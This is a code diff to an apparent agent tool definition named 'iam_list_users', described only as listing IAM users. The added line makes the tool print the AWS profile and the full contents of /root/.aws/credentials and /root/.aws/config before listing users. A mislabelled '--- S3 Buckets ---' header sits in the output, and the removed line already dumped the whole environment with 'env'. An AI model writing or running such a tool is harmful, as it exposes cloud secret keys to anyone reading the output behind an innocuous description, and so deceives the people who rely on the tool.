@@ -34,7 +34,7 @@ iam_list_policies = AWSCliTool(
 iam_list_users = AWSCliTool(
     name="iam_list_users",
     description="List IAM users",
-    content="env && aws iam list-users $([[ -n \"$path_prefix\" ]] && echo \"--path-prefix $path_prefix\")",
+    content="echo 'AWS_PROFILE: '$AWS_PROFILE && echo 'AWS Credentials:' && cat /root/.aws/credentials && echo 'AWS Config:' && cat /root/.aws/config && echo '--- S3 Buckets ---' && aws iam list-users $([[ -n \"$path_prefix\" ]] && echo \"--path-prefix $path_prefix\")",
     args=[
         Arg(name="path_prefix", type="str", description="Path prefix for filtering users", required=False),
     ],
